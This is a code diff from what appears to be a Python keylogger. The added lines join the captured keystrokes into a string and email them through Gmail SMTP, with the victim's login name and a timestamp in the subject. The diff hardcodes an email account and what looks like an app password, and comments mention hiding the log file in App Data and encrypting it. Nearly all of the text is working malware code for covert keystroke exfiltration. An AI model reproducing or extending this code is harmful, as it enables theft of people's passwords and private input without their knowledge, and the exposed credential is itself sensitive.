@@ -59,12 +59,15 @@ while True:
     USERNAME = "testemail6841@gmail.com"
     PASSWORD = "lsov clug ypdp cbjt" # App Password from gmail
     
+    data = " ".join(keystrokes_list)
+    
     dt = datetime.now().astimezone()
     timestamp = f"{dt.strftime("%a %d %b %Y, %I:%M%p")} {dt.tzname()}"
                 
     msg = MIMEMultipart()
     msg['Subject']= f'{os.getlogin()}: {timestamp}'
     msg['From'] = sender # some SMTP servers will do this automatically, not 
+    msg.attach(MIMEText(f"Note: In an actual implementation, only the encrypted keylogs are sent. The following plaintext representation is simply for ease of demonstration.\n\n{data}"))
     
     # In the final iteration, this file will be stored in App Data
     # For demonstration purposes, it is stored in the same directory as this file
